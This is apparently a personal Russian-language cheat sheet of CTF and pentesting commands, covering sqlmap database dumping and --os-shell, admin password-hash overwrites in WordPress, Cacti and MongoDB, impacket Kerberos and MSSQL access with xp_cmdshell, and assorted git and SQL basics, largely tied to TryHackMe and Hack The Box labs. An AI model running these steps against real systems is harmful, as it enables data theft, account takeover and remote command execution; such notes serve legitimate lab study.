Смотри. Этот алгоритм важно запомнить:

    Сначала сканишь базы флагом --dbs
     Выбираешь базу флагом -D и сканишь таблицы в ней флагом --tables
     Выбираешь базу -D,  таблицу -Т и дампишь ее целиком --dump
     Либо смотришь на колонки, если нужно определенные извлечь флагом --columns, после чего выбираешь колонку -C и дампишь выборочно.

# сканирование методом POST

sqlmap -u <URL> --forms --batch --random-agent --dbs



sqlmap -u "http://51.250.73.193:5008/" --data="username=admin23&password=aaa" --dbs --flush-session

--flush-session     Flush session files for current target(сброс кеша)

В Burp Copy to file запрос. в sqlmap -r файл с запросом -p параметр-уязвимый --затем опции. Пример с TryHackMe sqlmap -r req.txt -p blood_group --dbs.
substring(database(),2,1)='B'

https://tryhackme.com/room/sqlmap - пример использования с подгрузкой файла

sqlmap -u 'http://10.129.237.210/dashboard.php?search=FERA' --batch --random-agent --cookie='PHPSESSID=6et2iplhe59a7h6m2v55vjn49s' --os-shell

#set git config values #Авторизация
git config --global user.name "ваше имя"
git config --global user.email "ваше_мыло@gmail.com"
git config --global github.user ник
git config --global github.token your_token_here#Основные команды гит:
git clone [url]
git add . - Добавить все (. - Обозначает текущий каталог со всем содержимым)
git commit -m "mesage" - Создать комит
git push - отправить
git pull - Стянуть
git rn file_name - удалить из репозитория
git branch branch_name - создать ветку
git merge - сливает ветку с текущей
git status - получить статус
git checkout - переключение веток (отредактировано) 
  11:10
SQL
**********************************************************
Select tabl1.col1, tabl2.col1 from tabl1 INNER JOIN tabl2 on id(tabl1)=id(tabl2)Select tabl1.col1, tabl2.col1 from tabl1 OUTER LEFT JOIN tabl2 on id(tabl1)=id(tabl2)
FULL JOIN and CROSS JOIN (отредактировано) 


{{[]."-alert`xxx`-"}}

***********
# MYSQL server
mysql -h 123.123.131.131 -u root -p

mysql -u bolt_dba -p

SHOW databases; : Prints out the databases we can access.
USE {database_name}; : Set to use the database named {database_name}.
SHOW tables; : Prints out the available tables inside the current
database.
SELECT * FROM {table_name}; : Prints out all the data from the table {table_name}.

update {table_name} set {user_pass} = MD5('password123') where ID = 1;

# Подключение к mysql из нутри

mysql --host=db --user=root --password=root cacti -e "show tables"
mysql --host=db --user=root --password=root cacti -e "select * from user_auth"

mysql --user=root -p 

select * from wp_users \G (в удобном виде)

update wp_users set user_pass='$P$Bn.uHsPKseIJ4CdDVxOiQKmXFHrkC1.' where id=1;

update (tables_name) set (column_password_nmae)='$P$Bn.uHsPKseIJ4CdDVxOiQKmXFHrkC1.' where id=1;


# Подключение к БД windows microsoft sql service (MSSQL)

impacket-mssqlclient ARCHETYPE/sql_svc@10.129.21.3 -windows-auth

impacket-mssqlclient dc1.scrm.local -k (по керберосу)
---перед этим 

impacket-getTGT scrm.local/sqlsvc:Pegasus60

export KRB5CCNAME=sqlsvc.ccache

или по TGS - также но с генерацией TGS

enable_xp_cmdshell
xp_cmdshell

********************
select name from sys.databases;  (перечислить все базы данных)

select TABLE_NAME from ScrambleHR.INFORMATION_SCHEMA.TABLES;

select * from ScrambleHR.dbo.Employees; (выбрать все из таблицы ScramblerHR)

select * from wp_users \G (в удобном виде)

# mongodb
mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"

mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"SHA_512 Hash Generated"}})'


снаружи

mongo mongodb://10.129.142.102:27017

show dbs;
use {dbs_name};
show collections;
show tables;

db.{collect_name}.find().pretty();

select * from wp_users \G (в удобном виде)

# postgres

psql -U christine -h localhost -p 4444

\l - список таблиц

\с - конект с таблицей

\dt - выгрузить таблицу

select * from flag; - и так понятно

# SQLITE (python jinja)

sqlite3 db.sqlite

select * from User

.dump
